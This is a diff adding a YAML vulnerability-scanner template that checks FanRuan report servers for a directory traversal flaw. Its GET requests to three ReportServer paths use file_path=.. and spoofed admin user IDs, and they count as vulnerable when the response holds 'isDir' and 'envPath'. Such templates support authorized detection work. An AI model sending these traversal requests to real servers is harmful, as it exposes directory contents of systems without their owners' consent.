@@ -1,0 +1,25 @@
+id: frServer-listDir
+
+info:
+  name: 帆软目录遍历漏洞
+  author: Str1am
+  severity: high
+  tags: frServer,listDir
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/WebReport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=..&currentUserName=admin&currentUserId=1&isWebReport=true"
+      - "{{BaseURL}}/seeyonreport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=..&currentUserName=admin&currentUserId=1&isWebReport=true"
+      - "{{BaseURL}}/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=..&currentUserName=admin&currentUserId=1&isWebReport=true"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "isDir"
+          - "envPath"
+        part: body
+        condition: and
